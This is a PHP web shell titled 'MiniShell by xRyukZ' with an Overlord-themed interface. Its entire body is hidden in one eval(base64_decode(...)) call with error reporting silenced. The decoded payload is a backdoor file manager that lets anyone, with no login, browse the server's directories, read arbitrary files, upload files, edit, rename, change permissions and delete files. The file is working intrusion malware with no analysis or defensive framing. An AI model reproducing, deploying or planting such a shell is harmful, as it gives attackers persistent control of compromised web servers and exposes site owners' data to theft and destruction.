<?php
/*
   MiniShell by xRyukZ 
   Themes : Albedo (Overlord)
   ~ Xaverious Team ~
*/
error_reporting(0);set_time_limit(0);eval(base64_decode('aWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSl7DQpmb3JlYWNoKCRfUE9TVCBhcyAka2V5PT4kdmFsdWUpew0KJF9QT1NUWyRrZXldID0gc3RyaXBzbGFzaGVzKCR2YWx1ZSk7DQp9DQp9DQplY2hvICc8IURPQ1RZUEUgSFRNTD4NCjxodG1sPg0KPGhlYWQ+DQo8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIj4NCjx0aXRsZT4mIzEyMDM7JiM4MjQ7JiMxMjAyOyYjODI0OyYjMTIwMzsgT3ZlckxvcmQgJiMxMjAzOyYjODI0OyYjMTIwMjsmIzgyNDsmIzEyMDM7PC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cHM6Ly9jZG4uc2hvcGlmeS5jb20vcy9maWxlcy8xLzAwMzUvMjc4MC8yOTQ3L3Byb2R1Y3RzL0FsYmVkb19XZWJfMzAweDMwMC5wbmc/dj0xNTU1MTk1OTIzIiB0eXBlPSJpbWFnZS94LWljb24iPg0KPHN0eWxlPg0KQGltcG9ydCB1cmwoImh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1aQ09PTCtYaWFvV2VpIik7DQpib2R5ew0KYmFja2dyb3VuZDogdXJsKGh0dHBzOi8vd2FsbHBhcGVycGxheS5jb20vd2FsbHMvZnVsbC9mLzkvZC8zODk3OS5qcGcpIG5vLXJlcGVhdCBmaXhlZDsNCi13ZWJraXQtYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DQotbW96LWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0KLW8tYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DQpiYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNCmZvbnQtZmFtaWx5OiAiWkNPT0wgWGlhb1dlaSI7DQpjb2xvcjp3aGl0ZTsNCn0NCiNjb250ZW50IHRyOmhvdmVyew0KYmFja2dyb3VuZC1jb2xvcjogIzExMTExMTsNCn0NCiNjb250ZW50IC5maXJzdHsNCmJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQp9DQp0YWJsZXsNCmJvcmRlcjogMnB4ICMwMDAwMDAgc29saWQ7DQp9DQphew0KY29sb3I6d2hpdGU7DQp0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphOmhvdmVyew0KY29sb3I6IzAwMDAwMDsNCnRleHQtc2hhZG93OjBweCAwcHggMTBweCAjMTExMTExOw0KfQ0KaW5wdXQsc2VsZWN0LHRleHRhcmVhew0KY29sb3I6IHdoaXRlOw0KYmFja2dyb3VuZDogYmxhY2s7DQpib3JkZXI6IDJweCAjMDAwMDAwIHNvbGlkOw0KLW1vei1ib3JkZXItcmFkaXVzOiA1cHg7DQotd2Via2l0LWJvcmRlci1yYWRpdXM6NXB4Ow0KYm9yZGVyLXJhZGl1czo1cHg7DQp9DQpoMXsNCmNvbG9yOiAjMTExMTExOw0KZm9udC1zaXplOiA0dnc7DQp0ZXh0LXNoYWRvdzoxcHggMnB4IDBweCBwdXJwbGU7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8Y2VudGVyPg0KPGgxPjxpPk92ZXJMb3JkIFNoZWxsPC9pPjwvaDE+DQo8L2NlbnRlcj4NCjx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSI0IiBjZWxsc3BhY2luZz0iMiIgYWxpZ249ImNlbnRlciI+DQo8dHI+PHRkPjxmb250IGNvbG9yPSJ3aGl0ZSI+UGF0aCA6PC9mb250PiAnOw0KaWYoaXNzZXQoJF9HRVRbJ3BhdGgnXSkpew0KJHBhdGggPSAkX0dFVFsncGF0aCddOw0KfWVsc2V7DQokcGF0aCA9IGdldGN3ZCgpOw0KfQ0KJHBhdGggPSBzdHJfcmVwbGFjZSgnXFwnLCcvJywkcGF0aCk7DQokcGF0aHMgPSBleHBsb2RlKCcvJywkcGF0aCk7DQoNCmZvcmVhY2goJHBhdGhzIGFzICRpZD0+JHBhdCl7DQppZigkcGF0ID09ICcnICYmICRpZCA9PSAwKXsNCiRhID0gdHJ1ZTsNCmVjaG8gJzxhIGhyZWY9Ij9wYXRoPS8iPi88L2E+JzsNCmNvbnRpbnVlOw0KfQ0KaWYoJHBhdCA9PSAnJykgY29udGludWU7DQplY2hvICc8YSBocmVmPSI/cGF0aD0nOw0KZm9yKCRpPTA7JGk8PSRpZDskaSsrKXsNCmVjaG8gIiRwYXRoc1skaV0iOw0KaWYoJGkgIT0gJGlkKSBlY2hvICIvIjsNCn0NCmVjaG8gJyI+Jy4kcGF0Lic8L2E+Lyc7DQp9DQplY2hvICc8L3RkPjwvdHI+PHRyPjx0ZD4nOw0KaWYoaXNzZXQoJF9GSUxFU1snZmlsZSddKSl7DQppZihjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwkcGF0aC4nLycuJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKXsNCmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5VcGxvYWQgU3VjY2VzcyA6KTwvZm9udD48YnIgLz4nOw0KfWVsc2V7DQplY2hvICc8Zm9udCBjb2xvcj0icmVkIj5VcGxvYWQgRmFpbGVkIDooPC9mb250Pjxici8+JzsNCn0NCn0NCmVjaG8gJzxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCI+DQo8Zm9udCBjb2xvcj0id2hpdGUiPkZpbGUgVXBsb2FkIDo8L2ZvbnQ+IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiAvPg0KPGlucHV0IGJhY2tncm91bmQtY29sb3I9IndoaXRlIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQiIC8+DQo8L2Zvcm0+DQo8L3RkPjwvdHI+JzsNCmlmKGlzc2V0KCRfR0VUWydmaWxlc3JjJ10pKXsNCmVjaG8gIjx0cj48dGQ+Q3VycmVudCBGaWxlIDogIjsNCmVjaG8gJF9HRVRbJ2ZpbGVzcmMnXTsNCmVjaG8gJzwvdHI+PC90ZD48L3RhYmxlPjxiciAvPic7DQplY2hvKCc8cHJlPicuaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkX0dFVFsnZmlsZXNyYyddKSkuJzwvcHJlPicpOw0KfWVsc2VpZihpc3NldCgkX0dFVFsnb3B0aW9uJ10pICYmICRfUE9TVFsnb3B0J10gIT0gJ2RlbGV0ZScpew0KZWNobyAnPC90YWJsZT48YnIgLz48Y2VudGVyPicuJF9QT1NUWydwYXRoJ10uJzxiciAvPjxiciAvPic7DQppZigkX1BPU1RbJ29wdCddID09ICdjaG1vZCcpew0KaWYoaXNzZXQoJF9QT1NUWydwZXJtJ10pKXsNCmlmKGNobW9kKCRfUE9TVFsncGF0aCddLCRfUE9TVFsncGVybSddKSl7DQplY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+Q2hhbmdlIFBlcm1pc3Npb24gQmVyaGFzaWw8L2ZvbnQ+PGJyLz4nOw0KfWVsc2V7DQplY2hvICc8Zm9udCBjb2xvcj0icmVkIj5DaGFuZ2UgUGVybWlzc2lvbiBHYWdhbDwvZm9udD48YnIgLz4nOw0KfQ0KfQ0KZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4NClBlcm1pc3Npb24gOiA8aW5wdXQgbmFtZT0icGVybSIgdHlwZT0idGV4dCIgc2l6ZT0iNCIgdmFsdWU9Iicuc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRfUE9TVFsncGF0aCddKSksIC00KS4nIiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJjaG1vZCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIC8+DQo8L2Zvcm0+JzsNCn1lbHNlaWYoJF9QT1NUWydvcHQnXSA9PSAncmVuYW1lJyl7DQppZihpc3NldCgkX1BPU1RbJ25ld25hbWUnXSkpew0KaWYocmVuYW1lKCRfUE9TVFsncGF0aCddLCRwYXRoLicvJy4kX1BPU1RbJ25ld25hbWUnXSkpew0KZWNobyAnPGZvbnQgY29sb3I9ImxpbWUiPkdhbnRpIE5hbWEgQmVyaGFzaWw8L2ZvbnQ+PGJyLz4nOw0KfWVsc2V7DQplY2hvICc8Zm9udCBjb2xvcj0icmVkIj5HYW50aSBOYW1hIEdhZ2FsPC9mb250PjxiciAvPic7DQp9DQokX1BPU1RbJ25hbWUnXSA9ICRfUE9TVFsnbmV3bmFtZSddOw0KfQ0KZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj4NCk5ldyBOYW1lIDogPGlucHV0IG5hbWU9Im5ld25hbWUiIHR5cGU9InRleHQiIHNpemU9IjIwIiB2YWx1ZT0iJy4kX1BPU1RbJ25hbWUnXS4nIiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJyZW5hbWUiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiAvPg0KPC9mb3JtPic7DQp9ZWxzZWlmKCRfUE9TVFsnb3B0J10gPT0gJ2VkaXQnKXsNCmlmKGlzc2V0KCRfUE9TVFsnc3JjJ10pKXsNCiRmcCA9IGZvcGVuKCRfUE9TVFsncGF0aCddLCd3Jyk7DQppZihmd3JpdGUoJGZwLCRfUE9TVFsnc3JjJ10pKXsNCmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5CZXJoYXNpbCBFZGl0IEZpbGU8L2ZvbnQ+PGJyLz4nOw0KfWVsc2V7DQplY2hvICc8Zm9udCBjb2xvcj0icmVkIj5HYWdhbCBFZGl0IEZpbGU8L2ZvbnQ+PGJyLz4nOw0KfQ0KZmNsb3NlKCRmcCk7DQp9DQplY2hvICc8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPHRleHRhcmVhIGNvbHM9ODAgcm93cz0yMCBuYW1lPSJzcmMiPicuaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkX1BPU1RbJ3BhdGgnXSkpLic8L3RleHRhcmVhPjxiciAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJlZGl0Ij4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTYXZlIiAvPg0KPC9mb3JtPic7DQp9CQ0KZWNobyAnPC9jZW50ZXI+JzsNCn1lbHNlew0KZWNobyAnPC90YWJsZT48YnIvPjxjZW50ZXI+JzsNCmlmKGlzc2V0KCRfR0VUWydvcHRpb24nXSkgJiYgJF9QT1NUWydvcHQnXSA9PSAnZGVsZXRlJyl7DQppZigkX1BPU1RbJ3R5cGUnXSA9PSAnZGlyJyl7DQppZihybWRpcigkX1BPU1RbJ3BhdGgnXSkpew0KZWNobyAnPGZvbnQgY29sb3I9ImxpbWUiPkRpcmVjdG9yeSBUZXJoYXB1czwvZm9udD48YnIvPic7DQp9ZWxzZXsNCmVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkRpcmVjdG9yeSBHYWdhbCBUZXJoYXB1czwvZm9udD48YnIvPic7DQp9DQp9ZWxzZWlmKCRfUE9TVFsndHlwZSddID09ICdmaWxlJyl7DQppZih1bmxpbmsoJF9QT1NUWydwYXRoJ10pKXsNCmVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj5GaWxlIFRlcmhhcHVzPC9mb250Pjxici8+JzsNCn1lbHNlew0KZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RmlsZSBHYWdhbCBEaWhhcHVzPC9mb250Pjxici8+JzsNCn0NCn0NCn0NCmVjaG8gJzwvY2VudGVyPic7DQokc2NhbmRpciA9IHNjYW5kaXIoJHBhdGgpOw0KZWNobyAnPGRpdiBpZD0iY29udGVudCI+PHRhYmxlIHdpZHRoPSI3MDAiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIxIiBhbGlnbj0iY2VudGVyIj4NCjx0ciBjbGFzcz0iZmlyc3QiPg0KPHRkPjxjZW50ZXI+TmFtZTwvcGVsbGVyPjwvY2VudGVyPjwvdGQ+DQo8dGQ+PGNlbnRlcj5TaXplPC9wZWxsZXI+PC9jZW50ZXI+PC90ZD4NCjx0ZD48Y2VudGVyPlBlcm1pc3Npb248L3BlbGxlcj48L2NlbnRlcj48L3RkPg0KPHRkPjxjZW50ZXI+TW9kaWZ5PC9wZWxsZXI+PC9jZW50ZXI+PC90ZD4NCjwvdHI+JzsNCg0KZm9yZWFjaCgkc2NhbmRpciBhcyAkZGlyKXsNCmlmKCFpc19kaXIoJHBhdGguJy8nLiRkaXIpIHx8ICRkaXIgPT0gJy4nIHx8ICRkaXIgPT0gJy4uJykgY29udGludWU7DQplY2hvICc8dHI+DQo8dGQ+PGEgaHJlZj0iP3BhdGg9Jy4kcGF0aC4nLycuJGRpci4nIj4nLiRkaXIuJzwvYT48L3RkPg0KPHRkPjxjZW50ZXI+LS08L2NlbnRlcj48L3RkPg0KPHRkPjxjZW50ZXI+JzsNCmlmKGlzX3dyaXRhYmxlKCRwYXRoLicvJy4kZGlyKSkgZWNobyAnPGZvbnQgY29sb3I9ImxpbWUiPic7DQplbHNlaWYoIWlzX3JlYWRhYmxlKCRwYXRoLicvJy4kZGlyKSkgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+JzsNCmVjaG8gcGVybXMoJHBhdGguJy8nLiRkaXIpOw0KaWYoaXNfd3JpdGFibGUoJHBhdGguJy8nLiRkaXIpIHx8ICFpc19yZWFkYWJsZSgkcGF0aC4nLycuJGRpcikpIGVjaG8gJzwvZm9udD4nOw0KDQplY2hvICc8L2NlbnRlcj48L3RkPg0KPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9vcHRpb24mcGF0aD0nLiRwYXRoLiciPg0KPHNlbGVjdCBuYW1lPSJvcHQiPg0KPG9wdGlvbiB2YWx1ZT0iIj5TZWxlY3Q8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9ImRlbGV0ZSI+RGVsZXRlPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJjaG1vZCI+Q2htb2Q8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9InJlbmFtZSI+UmVuYW1lPC9vcHRpb24+DQo8L3NlbGVjdD4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSJkaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibmFtZSIgdmFsdWU9IicuJGRpci4nIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSInLiRwYXRoLicvJy4kZGlyLiciPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9Ij4+Ij4NCjwvZm9ybT48L2NlbnRlcj48L3RkPg0KPC90cj4nOw0KfQ0KZWNobyAnPHRyIGNsYXNzPSJmaXJzdCI+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PC90cj4nOw0KZm9yZWFjaCgkc2NhbmRpciBhcyAkZmlsZSl7DQppZighaXNfZmlsZSgkcGF0aC4nLycuJGZpbGUpKSBjb250aW51ZTsNCiRzaXplID0gZmlsZXNpemUoJHBhdGguJy8nLiRmaWxlKS8xMDI0Ow0KJHNpemUgPSByb3VuZCgkc2l6ZSwzKTsNCmlmKCRzaXplID49IDEwMjQpew0KJHNpemUgPSByb3VuZCgkc2l6ZS8xMDI0LDIpLicgTUInOw0KfWVsc2V7DQokc2l6ZSA9ICRzaXplLicgS0InOw0KfQ0KDQplY2hvICc8dHI+DQo8dGQ+PGEgaHJlZj0iP2ZpbGVzcmM9Jy4kcGF0aC4nLycuJGZpbGUuJyZwYXRoPScuJHBhdGguJyI+Jy4kZmlsZS4nPC9hPjwvdGQ+DQo8dGQ+PGNlbnRlcj4nLiRzaXplLic8L2NlbnRlcj48L3RkPg0KPHRkPjxjZW50ZXI+JzsNCmlmKGlzX3dyaXRhYmxlKCRwYXRoLicvJy4kZmlsZSkpIGVjaG8gJzxmb250IGNvbG9yPSJsaW1lIj4nOw0KZWxzZWlmKCFpc19yZWFkYWJsZSgkcGF0aC4nLycuJGZpbGUpKSBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj4nOw0KZWNobyBwZXJtcygkcGF0aC4nLycuJGZpbGUpOw0KaWYoaXNfd3JpdGFibGUoJHBhdGguJy8nLiRmaWxlKSB8fCAhaXNfcmVhZGFibGUoJHBhdGguJy8nLiRmaWxlKSkgZWNobyAnPC9mb250Pic7DQplY2hvICc8L2NlbnRlcj48L3RkPg0KPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9vcHRpb24mcGF0aD0nLiRwYXRoLiciPg0KPHNlbGVjdCBuYW1lPSJvcHQiPg0KPG9wdGlvbiB2YWx1ZT0iIj5TZWxlY3Q8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9ImRlbGV0ZSI+RGVsZXRlPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJjaG1vZCI+Q2htb2Q8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9InJlbmFtZSI+UmVuYW1lPC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPSJlZGl0Ij5FZGl0PC9vcHRpb24+DQo8L3NlbGVjdD4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSJmaWxlIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im5hbWUiIHZhbHVlPSInLiRmaWxlLiciPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJHBhdGguJy8nLiRmaWxlLiciPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9Ij4+Ij4NCjwvZm9ybT48L2NlbnRlcj48L3RkPg0KPC90cj4nOw0KfQ0KZWNobyAnPC90YWJsZT4NCjwvZGl2Pic7DQp9DQplY2hvICc8Y2VudGVyPjxici8+PGI+PGk+PGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Nhd2FscmV2ZXIiIHRhcmdldD0iX2JsYW5rIj48Zm9udCBjb2xvcj0iIzExMTExMSI+eFJ5dWtaIC0gQ29weXJpZ2h0IDJrMTk8L2ZvbnQ+PC9pPjwvYj48L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4nOw0KZnVuY3Rpb24gcGVybXMoJGZpbGUpew0KJHBlcm1zID0gZmlsZXBlcm1zKCRmaWxlKTsNCg0KaWYgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgew0KLy8gU29ja2V0DQokaW5mbyA9ICdzJzsNCn0gZWxzZWlmICgoJHBlcm1zICYgMHhBMDAwKSA9PSAweEEwMDApIHsNCi8vIFN5bWJvbGljIExpbmsNCiRpbmZvID0gJ2wnOw0KfSBlbHNlaWYgKCgkcGVybXMgJiAweDgwMDApID09IDB4ODAwMCkgew0KLy8gUmVndWxhcg0KJGluZm8gPSAnLSc7DQp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NjAwMCkgPT0gMHg2MDAwKSB7DQovLyBCbG9jayBzcGVjaWFsDQokaW5mbyA9ICdiJzsNCn0gZWxzZWlmICgoJHBlcm1zICYgMHg0MDAwKSA9PSAweDQwMDApIHsNCi8vIERpcmVjdG9yeQ0KJGluZm8gPSAnZCc7DQp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MjAwMCkgPT0gMHgyMDAwKSB7DQovLyBDaGFyYWN0ZXIgc3BlY2lhbA0KJGluZm8gPSAnYyc7DQp9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MTAwMCkgPT0gMHgxMDAwKSB7DQovLyBGSUZPIHBpcGUNCiRpbmZvID0gJ3AnOw0KfSBlbHNlIHsNCi8vIFVua25vd24NCiRpbmZvID0gJ3UnOw0KfQ0KDQovLyBPd25lcg0KJGluZm8gLj0gKCgkcGVybXMgJiAweDAxMDApID8gJ3InIDogJy0nKTsNCiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7DQokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDA0MCkgPw0KKCgkcGVybXMgJiAweDA4MDApID8gJ3MnIDogJ3gnICkgOg0KKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7DQoNCi8vIEdyb3VwDQokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAyMCkgPyAncicgOiAnLScpOw0KJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMTApID8gJ3cnIDogJy0nKTsNCiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDA4KSA/DQooKCRwZXJtcyAmIDB4MDQwMCkgPyAncycgOiAneCcgKSA6DQooKCRwZXJtcyAmIDB4MDQwMCkgPyAnUycgOiAnLScpKTsNCg0KLy8gV29ybGQNCiRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDA0KSA/ICdyJyA6ICctJyk7DQokaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOw0KJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDEpID8NCigoJHBlcm1zICYgMHgwMjAwKSA/ICd0JyA6ICd4JyApIDoNCigoJHBlcm1zICYgMHgwMjAwKSA/ICdUJyA6ICctJykpOw0KDQpyZXR1cm4gJGluZm87DQp9'))?>